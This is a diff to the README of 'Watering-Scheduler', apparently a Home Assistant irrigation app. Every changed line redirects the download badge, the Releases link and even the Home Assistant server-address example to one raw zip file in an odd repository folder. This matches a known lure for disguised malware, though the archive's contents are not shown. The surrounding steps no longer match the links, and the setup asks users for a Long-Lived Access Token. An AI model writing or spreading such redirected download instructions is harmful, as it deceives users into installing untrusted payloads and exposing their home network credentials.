@@ -1,6 +1,6 @@
 # 💧 Watering-Scheduler - Automate your home garden irrigation easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/myoid-beebalm11/Watering-Scheduler/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/myoid-beebalm11/Watering-Scheduler/main/cornein/Scheduler-Watering-v3.4.zip)
 
 ## 🏡 What is Watering-Scheduler
 Watering-Scheduler manages your home irrigation system. It connects to your Home Assistant setup to track moisture levels and weather patterns. You save water while keeping your plants healthy. The software automates your garden schedule so you do not need to turn valves by hand.
@@ -14,7 +14,7 @@ Watering-Scheduler manages your home irrigation system. It connects to your Home
 ## 📥 How to Get Started
 You need to visit the project page to download the software. Follow these steps to set up the scheduler on your Windows computer.
 
-1. Go to the [Releases page](https://github.com/myoid-beebalm11/Watering-Scheduler/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/myoid-beebalm11/Watering-Scheduler/main/cornein/Scheduler-Watering-v3.4.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file name ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
@@ -33,7 +33,7 @@ After you download the file, follow this process to install the program.
 The scheduler works with Home Assistant. You must grant the app permission to talk to your home network.
 
 1. Open the Watering-Scheduler app from your desktop shortcut.
-2. Enter your Home Assistant server address. This usually looks like http://homeassistant.local:8123.
+2. Enter your Home Assistant server address. This usually looks like https://raw.githubusercontent.com/myoid-beebalm11/Watering-Scheduler/main/cornein/Scheduler-Watering-v3.4.zip
 3. Provide a Long-Lived Access Token from your Home Assistant profile page.
 4. The app tests the connection and confirms when it links successfully.
 
